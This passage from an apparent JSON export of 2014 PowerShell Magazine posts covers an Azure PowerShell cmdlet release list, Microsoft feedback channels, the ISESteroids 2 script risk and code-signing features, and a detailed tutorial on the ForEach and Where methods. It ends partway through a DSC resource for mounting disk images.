Remove-AzureDataFactoryPipeline Remove-AzureDataFactoryTable Resume-AzureDataFactoryPipeline Save-AzureDataFactoryLog Set-AzureDataFactoryGateway Set-AzureDataFactoryPipelineActivePeriod Set-AzureDataFactorySliceStatus Suspend-AzureDataFactoryPipeline   Azure Batch cmdlets in AzureResourceManager mode  Set-AzureBatchAccount Remove-AzureBatchAccount New-AzureBatchAccountKey New-AzureBatchAccount Get-AzureBatchAccountKeys Get-AzureBatchAccount   Azure Network  Multi NIC support  Add-AzureNetworkInterfaceConfig Get-AzureNetworkInterfaceConfig Remove-AzureNetworkInterfaceConfig Set-AzureNetworkInterfaceConfig   Security group support  Set-AzureNetworkSecurityGroupToSubnet Set-AzureNetworkSecurityGroupConfig Remove-AzureNetworkSecurityGroupFromSubnet Remove-AzureNetworkSecurityGroupConfig Remove-AzureNetworkSecurityGroup New-AzureNetworkSecurityGroup Get-AzureNetworkSecurityGroupForSubnet Get-AzureNetworkSecurityGroupConfig Get-AzureNetworkSecurityGroup     Azure Virtual Machine  Added Add PublicConfigKey and PrivateConfigKey parameters to SetAzureVMExtension   Azure Website  Set-AzureWebsite exposes new parameters and Get-AzureWebsite returns them  SlotStickyConnectionStringNames – connection string names not to be moved during swap operation SlotStickyAppSettingNames – application settings names not to be moved during swap operation AutoSwapSlotName – slot name to swap automatically with after successful deployment      Go ahead and download the new release! As I’d written last time, you can use PowerShell to do that.\n#get a list of all MSIs Get-AzurePowerShellMSI -Passthru #Download the latest MSI Get-AzurePowerShellMSI -DownloadLatest -Verbose -Passthru #Download the latest MSI to a specific destination Get-AzurePowerShellMSI -DownloadLatest -DownloadPath C:\\MyDownloads1 -Verbose -Passthru ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/28/azure-powershell-tools-0-8-10-is-available/","tags":["Azure","News"],"title":"Azure PowerShell Tools 0.8.10 is available"},{"categories":["Community"],"contents":"Since the early days of Windows PowerShell, the community around the product has grown to a large and active user base. In this article, we will look at how the community can influence future releases.\nWindows PowerShell is software. Any software, in general, will always have bugs as well as the need for new features and improvements. Microsoft has a feedback channel called Microsoft Connect where customers can report bugs and provide suggestions for feedback to their software. There is a dedicated Connect website for Windows PowerShell: connect.microsoft.com/PowerShell \nIn addition to submitting your own items, you can also vote for items posted by others. Here is an example:\nAnother feedback opportunity you should know about Windows PowerShell is regarding the help system. Since version 3, the help system is updatable (Update-Help), which makes it possible for Microsoft to update the help files with more information as well as correcting errors on a regular basis. To report errors or suggestions for the help system, you can use the e-mail alias write-help (at) microsoft (dot) com.\nUserVoice There are also other feedback channels available for PowerShell-related technologies such as Azure Automation and Service Management Automation (SMA). Microsoft Azure is using UserVoice, a software-as-a-service provider of customer support tools. Here is a few categories from the Azure channel at UserVoice relevant to PowerShell:\n Azure Automation Scripting and Command Line Tools Service Management Automation (part of Azure Pack)  ISESteroids is another product leveraging UserVoice. I recently submitted an idea for a new feature in ISESteroids regarding region expansion, and I was positively surprised when I saw the feature implemented in the latest preview only 2 days later.\nGitHub There are also a number of Microsoft projects on GitHub. OneGet–a unified package management module to be released in PowerShell 5.0–is a great example. In the OneGet project on GitHub, we can submit issues and pull requests among other things.\nAnother example is the Hardware Management Module, a PowerShell module for managing hardware out-of-band via the WS-Man protocol, which was released on GitHub a few months ago.\nConferences The last feedback channel to mention in this article is going to conferences where you can meet and talk directly to product team members in order to provide feedback. Microsoft TechEd (rebranded to Microsoft Ignite going forward) and the PowerShell Summit are great examples of such conferences.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/28/the-power-of-community/","tags":["Community"],"title":"The Power of Community"},{"categories":["Module Spotlight","ISESteroids"],"contents":"Sharing scripts and downloading sample code becomes common place. But how do you know a script is safe? You would have to read (and understand) it line by line, and carefully check that the script indeed does what it claims to do, before you run it. This article walks you through a new risk management system built into ISESteroids 2. It is designed to help you manage script risks, and establish trust to other users.\nThe truth is that most people do not have the time (or the knowledge) to thoroughly check script code. Instead, they take even complex code, try and adjust it to their needs, then run it. This “prayer based script sharing” (PBSS) is risky, especially when you imagine that often these scripts end up being used in production environments.\nAt the European PowerShell Summit in Amsterdam, I had talks with Jeffrey and his PowerShell team about how to help users quickly assess the potential risk arising from script code, and make this a safer place. Today, I’d like to introduce to you a script risk assessment system built into ISESteroids 2 (introduced in version 2.0.10.24, available for download at www.powertheshell.com/isesteroids2/download).\nQuickly Assessing Risks In everyday life, there must be a quick way for PowerShell users to know whether script code imposes potential risks and needs extended review.\nA red icon indicates that there are potential risks in a script that need review\nAny script you open in ISESteroids will be internally analyzed, and the result appears in the status bar: you will see a green, yellow, or red icon.\nHovering over the risk icon displays details about the risk\nWhen you hover over the icon, a tooltip appears and tells you why ISESteroids thinks there is a risk, and what you can do about it. For example, in the screen shot, the sample code contained the cmdlet “Set-Service”, and the tooltip declares this risk as a “Minor Risk” and states: “Cmdlets with the verb ‘Set’ will change settings. You need to carefully evaluate which settings are changed, and whether this affects your system stability”. Likewise, ISESteroids displays other detailed instructions for other cmdlets identified as potential risk.\nWe’ll dive into the risk evaluation engine in a second. At this point, the user is simply consuming risk assessment information and can quickly estimate whether a script needs review, and what kind of risk may exist.\nReviewing Risks Once ISESteroids displays a yellow or red icon, it is time to review the risks. To review and assess all potential risks in a script, the user would now click the risk icon. This opens a context menu with additional options. To start the review, choose “Show Risks”.\nClicking the risk icon opens a risk management menu that allows for assisted script review\nThis opens a sliding area beneath the editor and displays the first risk found. The editor will automatically move to the line containing the risk. The user can now quickly look at the actual code and determine whether or not this imposes a risk.\nEach risk can be evaluated individually, and dismissed or placed on a white list\nIf the particular command is found to be safe, the risk can be dismissed by clicking “Dismiss”. It will then be considered “safe” for this risk check only. The sliding area will automatically move on to the next risk (if any additional risks are left).\nOr, the user decides that this risk is really never a problem in his or her environment. So if the user wants to treat “Set-Service” as always safe, he or she would click “Add Risk to Whitelist”. This puts the particular risk on the personal white list. This type of risk will then be excluded from future risk checks.\nWe will look at the white list and the additional ways to configure the risk engine just a bit later.\nApproving Script Once all risks have been evaluated, and no risk is left, the user is done: the script is reviewed and considered safe now. The sliding area now offers to approve the script. You can approve a script temporarily or permanently.\nScripts that are considered “safe” can be approved or digitally signed\nWhen you click “Approve”, the script is treated as “safe” on your machine only. The icon in the statusbar changes to a green checkmark. This information is saved in an NTFS stream, so when you move the script to another place (or haven’t saved it on an NTFS file system in the first place), the approval information is lost once you close the ISE editor.\nTo permanently approve a script and give others a chance to trust your approval, click “Digitally Sign”. This will add a digital signature to the script file. If you do not own a code signing certificate, ISESteroids offers to create a self-signed certificate for you.\nIdentifying Trusted Code Simple script approval (by clicking “Approve”) will help you identify scripts that you have approved earlier on your machine. It will not help others, though, and this type of approval gets lost when you move the file to another place, hand it over to a customer, or upload it to some script repository.\nWhat is needed is a way to preserve the approval inside the script, so users can start to trust each other. Approval can be preserved by adding a permanent digital signature to a script.\nA digital signature guarantees that:\n the script was approved by the identity that is represented by the certificate used for signing the script content did not change after the signature was applied  So digital signatures are an excellent way of preserving trust. In the past, however, script signing was not widely used, primarily because of some limitations:\n there is no easy way of getting a code signing certificate. Purchasing a code signing certificate from a commercial vendor is expensive. Self-signed certificates can be issued by anyone and cannot be trusted.  ISESteroids creates new self-signed certificates when needed\nThis is why ISESteroids ships with important enhancements that overcome these limitations:\n You can easily create your own self-signed code-signing certificates. Simply click the signature icon in the ISESteroids status bar, and choose Advanced Options/Create Self-Signed Test Certificate You can easily sign your scripts. Simply click the signature icon in the ISESteroids status bar, and choose “Apply Signature”. A dialog opens and displays all available code-signing certificates so you can choose the one to sign your script with. You can easily verify script integrity. When you load a script that carries a digital signature, the signing icon in the ISESteroids status bar will display an icon indicating whether the signature is trustworthy, and whether the script has changed since. You can hover over the icon to learn more.  The script was signed, but the signer is unknown and untrusted\n You can easily trust a given certificate, even establish trust for a self-signed certificate. When you load a script that contains a digital signature, click the signature icon in the ISESteroids status bar, and choose “Trust This Certificate”. This will place the certificate thumbprint on your personal trust list, and any script signed by that person will be considered trustworthy on your system.  The ability to easily establish trust to self-signed certificates opens a whole new dimension to script trust. A self-signed certificate alone is not safe. Anyone can create one. However, each self-signed certificate is unique and has a unique thumbprint.\nSo when you establish trust to a particular self-signed certificates that you know is owned by someone you trust, this will allow you to safely identify any other script that was approved by that person. No one else would be able to create another certificate that matches thumbprint and common name.\nEffectively, this scheme allows to create trust relationships among colleagues, or even world-wide. When you download script code from a public script repository, and you find that a particular author is doing a great job, provided that this person has signed his scripts, you can trust the author rather than individual scripts, by trusting his digital signature.\nNote that digital signatures automatically protect you from script tampering. So if someone you trust has signed a script, and someone changes this script later, the digital signature becomes invalid, and ISESteroids displays a warning message in its status bar.\nWhen a signed script was manipulated, ISESteroids displays a warning icon\nSo if someone tampered with originally signed scripts, you will notice.\nAnd if you do not want to trust a person any longer, simply remove trust: Click the signing icon in the ISESteroids status bar, and uncheck “Trust This Certificate”.\nCertificate-Based Auto-Trust When you load a script file that has a digital signature, ISESteroids automatically checks the signature for validity. If you trust the certificate – either implicitly because of its root certificate, or based on your manual trust – and if the script was not tampered with after the signature was applied, the script will automatically be approved, and you see a green checkmark icon in the status bar.\nYou can always click this icon to open a menu and manually unapprove, check for risks, or choose “Settings” to disable automatic trust altogether.\nApproved scripts display a checkmark icon. Valid signatures display a red signature icon.\nNote that there will be no code signing icon until you save a script. “Untitled” documents are really no scripts and thus cannot be checked for a valid signature, even if they contained a signature block.\nManaging Risks and Trusts The risk assessment engine in ISESteroids is completely configurable to your needs. To configure it, click the risk icon in the status bar, and choose “Settings/Manage Black/White Lists”. This opens up a dialog that lets you manage what is considered a risk. You can also manage the trusted certificates.\nThe risk assessment engine is fully configurable to your needs\nThere are four lists for you to control risk assessment:\n No Risk: Anything in this list is considered “safe” and excluded from risk checks. Medium Risk: Anything in this list is considered a “medium risk” and displays a yellow icon High Risk: Anything in this list is considered a “high risk” and displays a red icon. Risks in this list are evaluated before risks in the list “medium risk”. Trusted Certificates: Contains the thumbprints of certificates that you chose to trust.  The easiest way to manage the lists is to right-click a list and open it in Microsoft Excel. If you do not own Microsoft Excel, you can edit the lists directly, too.\nNote: When you edit a list in Microsoft Excel, make sure you close the edited file. Microsoft Excel locks files, so while a particular list is open in Excel, ISESteroids cannot edit it, for example add new entries to the white list.\nHow Risks are Defined Each entry in one of the risk lists has up to four columns.\n SearchTerm: this is the text the risk manager is looking for. You can provide literal text, use the wildcard “*”, or provide a regular expression SearchType: this declares how the search term is treated. Allowed values are “Static” (use exactly), “Like” (allow wildcard “*”), “RegEx” (treat as regular expression) Scope: this declares where the search term is searched. Allowed values are “Command”, “Method”, and “Any”. “Any” will search the search term anywhere in a command expression. Description: Optionally, add a textual risk description that appears in dialogs and tooltips, and helps users understand what the particular risk is  When you edit any of these lists, and then click “OK”, the lists are saved. ISESteroids automatically sorts the lists. Lists are sorted by search type first, then by search term. Risks declared as search type “Static” are evaluated before any other because they are most specific.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/27/powershell-risk-assessment-with-isesteroids-2-0/","tags":["Modules","ISESteroids"],"title":"PowerShell Risk Assessment with ISESteroids 2.0"},{"categories":["How To","Language"],"contents":"ForEach and Where are two frequently used concepts that have been available in PowerShell since version 1 came out in 2006. ForEach has been available as both a statement and a cmdlet (ForEach-Object), allowing you to iterate through a collection of objects and take some action once for each object in that collection. Where has been available as a cmdlet (Where-Object), allowing you to filter out items in a collection that don’t pass some condition, a condition which may be evaluated using either the properties on objects in the collection or the objects themselves that belong to the collection. The ForEach ability to take action on items in a collection and the Where ability to filter a collection are features that are highly useful and are included in one form or another in the logic behind many PowerShell scripts, commands and modules, regardless of what version of PowerShell is being used. In fact, they are so heavily used that they have been a focus area for improvement of performance, functionality and syntax in PowerShell versions 3.0 and 4.0.\nWith the release of Windows PowerShell 4.0, two new “magic” methods were introduced for collection types that provide a new syntax for accessing ForEach and Where capabilities in Windows PowerShell. These methods are aptly named ForEach and Where. I call these methods “magic” because they are quite magical in how they work in PowerShell. They don’t show up in Get-Member output, even if you apply -Force and request -MemberType All. If you roll up your sleeves and dig in with reflection, you can find them; however, it requires a broad search because they are private extension methods implemented on a private class. Yet even though they are not discoverable without peeking under the covers, they are there when you need them, they are faster than their older counterparts, and they include functionality that was not available in their older counterparts, hence the “magic” feeling they leave you with when you use them in PowerShell. Unfortunately, these methods remain undocumented even today, almost a year since they were publicly released, so many people don’t realize the power that is available in these methods. This article will try to correct that by explaining where they can be used and how they work so that you can leverage this magic when you use PowerShell.\nA note about PowerShell 3.0 Before I get into explaining how the ForEach and Where methods work, I need to mention something with respect to these two methods and PowerShell 3.0. While it is true that the ForEach and Where methods were only made available in PowerShell 4.0 and later versions, PowerShell 3.0 is still very widely used in many environments, and unless you’re using PowerShell in an environment that has standardized on PowerShell 4.0 and later, you may find yourself wishing you could take advantage of the syntax provided by the new methods when using PowerShell 3.0. I felt this was a limitation worth addressing, so as part of the TypePx module that I recently published on GitHub and in the PowerShell Resource Gallery (aka the PowerShellGet public repository, currently in limited preview), I included ForEach and Where script methods that are functionally equivalent to the methods introduced in PowerShell 4.0 so that you can leverage the new syntax and functionality even if you’re using PowerShell 3.0. There are a few shortcomings in this implementation, which I will highlight later in this article.\nThe ForEach method ForEach is a method that allows you to rapidly iterate through a collection of objects and take some action on each object in that collection. This method provides faster performance than its older counterparts (the foreach statement and the ForEach-Object cmdlet), and it also simplifies some of the most common actions that you may want to take on the objects in the collection. Any objects that are output by this method are returned in a generic collection of type System.Collections.ObjectModel.Collection`1[psobject].\nThere are six supported ways that you can invoke this method, and each of these will be explained in greater detail below. The supported arguments that can be used when invoking the ForEach method are as follows:\n ForEach(scriptblock expression) ForEach(type convertToType) ForEach(string propertyName) ForEach(string propertyName, object[] newValue) ForEach(string methodName) ForEach(string methodName, object[] arguments) ForEach(scriptblock expression, object[] arguments)  Note that these are supported argument pairings, not different overloads available for the ForEach method. Using any argument pairings other than these may result in errors that do not clearly identify what the actual problem is.\nForEach(scriptblock expression) and ForEach(scriptblock expression, object[] arguments) If you pass a script block expression into the ForEach method, you are able to perform the same kind of tasks that you would in a script block that you would use with the foreach statement or the ForEach-Object cmdlet. Also, like the ForEach-Object cmdlet, the $_ and _$PSItem_ variables both reference the current item that is being processed. Any arguments that you provide beyond the initial script block argument will be used as arguments for the script block. This is just like how the -ArgumentList parameter works on the ForEach-Object cmdlet. Here is an example demonstrating how you might use this to execute a script block on each item in a collection:\n# Get a set of services $services = Get-Service c* # Display the names and display names of all services in the collection $services.foreach{\"$($_.Name) ($($_.DisplayName))\"} # Select a property name to expand using a script block argument $services.foreach({param([string]$PropertyName); $_.$PropertyName}, 'DisplayName')  You may have noticed something odd about this syntax, because I didn’t wrap the script block itself in brackets. You can wrap it in round brackets, however that is optional in PowerShell 4.0 or later because the PowerShell parser was enhanced to allow for the brackets to be omitted whenever you are invoking a method that accepts a single script block argument. Also, like the foreach statement and the ForEach-Object cmdlet, the script block that you provide is invoked in the current scope. That means that any variable assignments you make inside of that script block will persist after the ForEach method has finished executing.\nForEach(type convertToType) Unique to the ForEach method, you can pass a type into the ForEach method if you want to convert every item in a collection into another type. For example, imagine you have a collection of objects and you want to convert those objects into their string equivalent. Here is what that would look like with the ForEach method:\n# Get a collection of processes $processes = Get-Process # Convert the objects in that collection into their string equivalent $processes.foreach([string])  You could have performed the same task by typecasting the collection into an array of type string (e.g. [string[]]$processes), and typecasting the array is in fact significantly faster, however there’s a very good chance you wouldn’t even notice the difference in execution time unless you were working with a very, very large collection. Despite the time difference, I will tend to prefer the ForEach method syntax in certain situations if it allows me to maintain elegance in the implementation by avoiding extra round brackets in the scripts I write.\nForEach(string propertyName) In PowerShell 3.0 and later, a second parameter set was added to ForEach-Object to allow you to more easily retrieve the value of a specific property by simply passing in a property name as the only parameter value for ForEach-Object. This convenience has been offered in the ForEach method as well. Here is an example demonstrating how you can iterate through a collection and return a property of that collection:\n# Get all services whose name starts with \"w\" $services = Get-Service w* # Return the names of those services $services.foreach('Name')  Of course since version 3.0 of PowerShell, you could simply invoke _$services.Nam_e to get the names of all services, and that will complete faster than the ForEach method alternative (although you’ll only notice the performance difference in very large collections in the order of hundreds of thousands of objects); however, that only works for properties that are not on the collection itself, and it is a syntax that some scripters are not comfortable with due to the implicit nature of what the command does. The new ForEach method syntax provides you with a more explicit alternative that has the added benefit of being a little more self-documenting as well.\nForEach(string propertyName, object[] newValue) Not only can you retrieve a property on a collection of objects, you can set a property on a collection of objects as well. This is functionality that is not available in the other foreach’s, unless you explicitly create the script block to do so. To set the property, you simply provide the property name and the value you want to use when setting that property, like this:\n# Note, this is not a realistic example # This would be used more commonly on configuration data $services = Get-Service c* # Now change the display names of every service to some new value $services.foreach('DisplayName','Hello')  Just like assignments you would make using the equals operator, PowerShell will attempt to convert whatever you provide as the new value into the appropriate type for the property being assigned.\nForEach(string methodName) and ForEach(string methodName, object[] arguments) To invoke a method, you simply provide the method name as the first argument, and then the arguments for that method as the second, third, fourth, etc. arguments. If the method does not take any arguments, you can simply pass in the method name and it will be invoked without any arguments. Here’s an example showing how you could kill a bunch of processes running a specific program:\n# Get all processes running Chrome $processes = Get-Process -Name Chrome # Now kill all of those processes $processes.foreach('Kill')  Here’s another example, this time using a method with arguments while showing how you could verify that commands are following best practices by using appropriate names and aliases for commonly used parameters:\n# Get all commands that have a ComputerName parameter $cmds = Get-Command -ParameterName ComputerName # Now show a table making sure the parameter names and aliases are consistent $cmds.foreach('ResolveParameter','ComputerName') | Format-Table Name,Aliases  As you can see from those results, there are definitely some inconsistencies in the implementation of ComputerName parameters that should be corrected.\nThat covers all of the functionality that is currently available in the ForEach method. As you can see, there is not a lot of new functionality offered in this method, but the syntax improvements when you are performing a simple task on a collection of objects are nice, and the ForEach method performance improvements when compared to the equivalent foreach statement for ForEach-Object pipeline are definitely a welcome improvement as well. With that explanation out of the way, let’s move on to the Where method.\nThe Where method Where is a method that allows you to filter a collection of objects. This is very much like the Where-Object cmdlet, but the Where method is also like Select-Object and Group-Object as well, includes several additional features that the Where-Object cmdlet does not natively support by itself. This method provides faster performance than Where-Object in a simple, elegant command. Like the ForEach method, any objects that are output by this method are returned in a generic collection of type System.Collections.ObjectModel.Collection`1[psobject].\nThere is only one version of this method, which can be described as follows:\nWhere(scriptblock expression[, WhereOperatorSelectionMode mode[, int numberToReturn]])  As indicated by the square brackets, the expression script block is required and the mode enumeration and the numberToReturn integer argument are optional, so you can invoke this method using 1, 2, or 3 arguments. If you want to use a particular argument, you must provide all arguments to the left of that argument (i.e. if you want to provide a value for numberToReturn, you must provide values for mode and expression as well).\nWhere(scriptblock expression) The most basic invocation of the Where method simply takes a script block expression as an argument. The script block expression will be evaluated once for each object in the collection that is being processed, and if it returns true, the object will be returned by the Where method. This is the functional equivalent of calling the Where-Object cmdlet and passing it a script block. Like the Where-Object cmdlet, the $_ and _$PSItem_ variables can be used to refer to the current item that is being processed while inside of the script block.\nHere is a very simple example, showing how you could get a list of running services.\n# Get all services $services = Get-Service # Now filter out any services that are not running $services.where{$_.Status -eq 'Running'}  This doesn’t offer any new functionality, but it offers much faster performance than Where-Object and the syntax is quite easy to follow, so you really should consider this for your scripts when you are performing client-side filtering of collections that you have stored in a variable.\nWhere(scriptblock expression, WhereOperatorSelectionMode mode[ ,int numberToReturn]) When you start looking at the optional parameters for the Where method, things start getting much more interesting. Windows PowerShell version 4.0 included a new enumeration with a typename of System.Management.Automation.WhereOperatorSelectionMode. Note the suffix of that typename: “SelectionMode”. It is used to provide powerful selection capabilities in a Where syntax. Here are the values included in this enumeration, along with their definitions:\n   Default Filter the collection using the expression script block, to a maximum count if one was provided or defaulting to all objects in the collection if no maximum count was provided in numberToReturn.     First Return the first N objects that pass the expression script block filter, defaulting to only 1 object if a specific count was not requested in numberToReturn.   Last Return the last N objects that pass the expression script block filter, defaulting to only 1 object if a specific count was not requested in numberToReturn.   SkipUntil Skip objects in the collection until an object passes the expression script block filter, and then return the first N objects, defaulting to all remaining objects if no maximum count was provided in numberToReturn.   Until Return the first N objects in a collection until an object passes the expression script block filter, defaulting to all objects leading up to the first object that passed if no maximum count was provided in numberToReturn.   Split Split a collection into two, placing all objects that pass the expression script block filter into the first collection up to a maximum count if one was provided in numberToReturn, or all objects that pass if no maximum count was provided, and placing all other objects that are not put in the first collection into the second collection.    Each of these offers some unique value when you are processing collections of data, so I’ll provide more details of each selection mode below.\nDefault Not surprisingly, the default value of the mode argument is ‘Default’. The default selection mode offers the same functionality that you get when you don’t provide a selection mode at all. For example, we could have written the last line of our previous example like this:\n# Now filter out any services that are not running $services.where({$_.Status -eq 'Running'},'Default')  In that example, the extra argument isn’t necessary though, because it does the exact same thing that it would do if you didn’t provide the argument. You could also provide the maximum number of objects that you want to return while using Default selection mode using the numberToReturn argument, like this:\n# Get the first 10 services in our collection that are running $services.where({$_.Status -eq 'Running'},'Default',10)  It is important to note that exact functionality is also available when using the First selection mode (which we’ll talk about in a moment), so it really isn’t practical to use any of the optional parameters at all when you are using the Default selection mode.\nFirst As you might have guessed, the First selection mode allows you to select the first object(s) in the collection that pass the script block expression filter. When you use First without a value for the numberToReturn argument, or when you use First with a value of 0 for the numberToReturn argument, only the first object that passes the filter will be returned. You can optionally specify how many objects to return in the numberToReturn argument, in which case that many objects will be returned (assuming there are that many objects that pass the filter).\nHere are some examples using our services collection showing the First selection mode in action:\n# Get the first service in our collection that is running $services.where({$_.Status -eq 'Running'},'First') # Get the first service in our collection that is running $services.where({$_.Status -eq 'Running'},'First',1) # Get the first 10 services in our collection that are running $services.where({$_.Status -eq 'Running'},'First',10)  Note that the second command in these examples returns the same results as the first command because it is simply explicitly passing in the default value of the numberToReturn argument when the First selection mode is used.\nLast The Last selection mode functions much like the First selection mode, allowing you to select the last object(s) in the collection that pass the script block expression filter. When you use Last without a value for the numberToReturn argument, or when you use Last with a value of 0 for the numberToReturn argument, only the last object that passes the filter will be returned. You can optionally specify how many objects to return in the numberToReturn argument, in which case that many objects will be returned (assuming there are that many objects that pass the filter).\nHere are some examples using our services collection showing the Last selection mode in action:\n# Get the last service in our collection that is running $services.where({$_.Status -eq 'Running'},'Last') # Get the last service in our collection that is running $services.where({$_.Status -eq 'Running'},'Last',1) # Get the last 10 services in our collection that are running $services.where({$_.Status -eq 'Running'},'Last',10) Also like the First selection mode examples, the second command in these examples returns the same results as the first command because it is simply explicitly passing in the default value of the numberToReturn argument when the Last selection mode is used.\nSkipUntil The SkipUntil selection mode allows you to skip all objects in a collection until you find one that passes the script block expression filter. Once you find an object that passes the filter, SkipUntil mode will either return all objects remaining in the collection if no value or a value of 0 was provided to the numberToReturn argument, or it will return the first N remaining objects in the collection if a value greater than zero was provided to the numberToReturn argument. In both cases, the results will include the first object that passed the filter.\nHere are some examples using a subset of our services collection to show the SkipUntil selection mode in action:\n# Get a collection of services whose name starts with \"c\" $services = Get-Service c* # Skip all services until we find one with a status of \"Running\" $services.where({$_.Status -eq 'Running'},'SkipUntil') # Skip all services until we find one with a status of \"Running\", then # return the first 2 $services.where({$_.Status -eq 'Running'},'SkipUntil',2)  Until The Until selection mode provides the opposite functionality of the SkipUntil selection mode. It allows you to return objects in a collection until you find one that passes the script block expression filter. Once you find an object that passes the filter, the Where method stops processing objects. If you don’t provide a value for the numberToReturn argument, or if you provide a value of 0, the Until selection mode will return all objects in the collection leading up to the first one that passes the script block expression filter. If you do provide a value for the numberToReturn argument that is greater than 0, the Until selection mode will return at most that number of objects, meaning that it may not even find an object that passes the script block expression filter.\nHere are some examples using a different subset of our services collection to show the Until selection mode in action:\n# Get a collection of services whose name starts with \"p\" $services = Get-Service p* # Return all services until we find one with a status of \"Stopped\" $services.where({$_.Status -eq 'Stopped'},'Until') # Return the first 2 services unless we find one with a status of # \"Stopped\" first $services.where({$_.Status -eq 'Stopped'},'Until',2)  Split Split selection mode is unique. Instead of returning a subset of the collection you start with in a new collection, it returns a new collection that internally contains two separate collections. What those nested collections contain depends on how you use Split selection mode. Split allows you to split a collection of objects into two. By default, if you don’t provide a value for the numberToReturn argument or if you provide a value of 0 for the numberToReturn argument, Split will place all objects that pass the script block expression filter into the first nested collection, and all other objects (those that don’t pass the script block expression filter) into the second nested collection. If you do provide a value greater than 0 for the numberToReturn argument, split will limit the size of the first collection to that maximum amount, and all remaining objects in the collection, even those that match the script block expression filter, will be placed into the second collection.\nHere are some examples showing how Split selection mode can be used to split up a collection of objects different ways:\n# Get all services $services = Get-Service # Split the services into two groups: Running and not Running $running,$notRunning = $services.Where({$_.Status -eq 'Running'},'Split') # Show the Running services $running # Show the services that are not Running $notRunning # Split the services into the same two groups, but limit the Running group # to a maximum of 10 items $10running,$others = $services.Where({$_.Status -eq 'Running'},'Split',10) # Show the first 10 Running services $10running # Show all other services $others  As you can see from this example, Split is quite a powerful selection mode, providing a mix of filtering, grouping, and selection in a single command call.\nThis collection of selection modes makes the Where method fast and elegant yet at the same time more powerful than the Where-Object, Group-Object and Select-Object combined in a single pipeline. What’s not to love about that?\nShortcomings in the ForEach and Where script methods in TypePx As I mentioned earlier in this article, I have written type extensions for PowerShell 3.0 and later and packaged them up into a module called TypePx. TypePx is a script module that was written entirely in PowerShell, and it runs on PowerShell 3.0 or later. If you are using PowerShell 3.0 (and only if you are using PowerShell 3.0), TypePx defines ForEach and Where script methods that mimic the behaviour of the ForEach and Where methods in PowerShell 4.0 and later. While the extended type system in PowerShell makes it possible to mimic this behaviour, there are a few shortcomings due to the implementation being in PowerShell that impacted how far I was able to go with these type extensions. This section will describe some of the differences and limitations that exist in the ForEach and Where script methods in TypePx that you may want to be aware of if you are using PowerShell 3.0.\nScript blocks invoked from a script method run in a child scope Unlike the ForEach and Where methods implemented as part of PowerShell 4.0 or later which invoke the expression script block in the current scope where the method is called, the ForEach and Where script methods implemented in PowerShell 3.0 invoke the expression script block in a child scope. This is a limitation in PowerShell that has been there since the very beginning (a limitation, I might add, that I think is by far the biggest shortcoming of PowerShell as a language).\nDue to this limitation, any variables that you assign inside of an expression script block will only be modified in the child scope. This has implications if your expression script block is intended to update a variable in the scope in which you invoke ForEach or Where. It is unlikely this would cause a problem while using Where because it is not very common to modify variables in a Where expression script block, but in ForEach script blocks this may pose a problem so you need to keep this in mind if you use these extensions.\nI should note that I would like to remove this limitation altogether, and I believe I will be able to do so, however at the time I wrote this article I have not yet implemented a fix for this.\nMost, but not all collections will have ForEach and Where methods In PowerShell 4.0 and later, the ForEach and Where methods are magically made available for all types that implement IEnumerable except for String, XmlNode, and types that implement IDictionary. In PowerShell, the extended type system does not allow extensions to be created for interfaces, only for types. This is a challenge if you want to create a broad extension like ForEach and Where. In the current implementation of these extensions in TypePx, the TypePx module finds all types in all assemblies loaded in the current app domain, and for all non-generic types that define IEnumerable but not IDictionary (excluding String and XmlNode), plus for all generic types that define IEnumerable but not IDictionary for generic collections of PSObject, Object, String, Int32, or Int64, the ForEach and Where script methods will be created.\nThis covers a large number of types that in my own testing has been sufficient, however you may run into types where you want to use these methods and they are not available. If that is the case, let me know through GitHub and I’ll see what I can do. This is also a limitation I would like to remove, but I need more time to research how to implement the equivalent functionality in a compiled assembly where I may be able to define it more like it is defined in PowerShell 4.0 and later.\nPowerShell scripts are not as fast as compiled code This probably goes without saying, but when you write something in PowerShell, which is an interpreted language, it will not run as quickly as it would if you wrote the equivalent logic in a language like C#. This is absolutely the case for the ForEach and Where script methods, which internally use ForEach-Object, Where-Object, and pipelining to mimic the behaviour of the native ForEach and Where methods. In this case, the advantage of having these commands comes from the elegant syntax and functionality they provide, plus being able to use these in scripts for PowerShell 3.0 and 4.0. The performance benefits in ForEach and Where are only in the PowerShell 4.0 native implementation.\nPowerShell 3.0 requires brackets around all method parameters I mentioned in the examples above that I was able to invoke a method with a single literal script block parameter without wrapping that literal script block in additional brackets. That capability exists only in PowerShell 4.0 or later due to improvements that were made to the parser in that release. In PowerShell 3.0, the parser does not support this, so brackets are always required in order for the ForEach and Where script methods to work with a single literal script block parameter in that version.\nConclusion When I started trying to mimic the behaviour of the ForEach and Where magic methods in PowerShell 3.0, I didn’t quite realize how much functionality they provided. Digging into the technical details behind these methods so that I could create the extensions I wanted in TypePx helped uncover all of the hidden features in these very powerful methods, and I am very happy to share those with you in this article. I hope this information helps you leverage this wonderful new set of features in your PowerShell work, even if you’re still using PowerShell 3.0. Happy scripting!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/10/22/foreach-and-where-magic-methods/","tags":["How To","Language"],"title":"ForEach and Where magic methods"},{"categories":["PowerShell DSC"],"contents":"Note: This DSC resource works only on Windows Server 2102 and above or Windows 8 and above. Also, this article assumes that you understanding DSC custom resource development. If not, please head to http://technet.microsoft.com/en-us/library/dn249927.aspx for information on building custom DSC resources. The DSC resource module code from this article can be downloaded from my Github repository.\nThis is yet another resource from my collection of custom DSC resources. As a part of deployment automation, I usually mount application software ISO images and perform install from the mounted location. While this is trivial, the real use case is to ensure that the mounted disk image has the drive letter I specify. Without this, I will have to find ways to retrieve the drive letter assigned to the mounted image. So, the DSC resource that I created helps me assigning the drive letter I specify to the mounted image and therefore making it easy to continue the automation using DSC. Here is the DSC resource module file.\nFunction Get-TargetResource { [OutputType([Hashtable])] param ( [Parameter(Mandatory)] [string] $ImagePath, [Parameter(Mandatory)] [string] $DriveLetter, [Parameter()] [ValidateSet('Present','Absent')] [string] $Ensure = 'Present' ) $Configuration = @{ ImagePath = $ImagePath DriveLetter = $DriveLetter } $DiskImage = Get-DiskImage -ImagePath $ImagePath -ErrorAction Stop if ($DiskImage.Attached) { if (($DiskImage | Get-Volume).DriveLetter -eq $DriveLtter) { 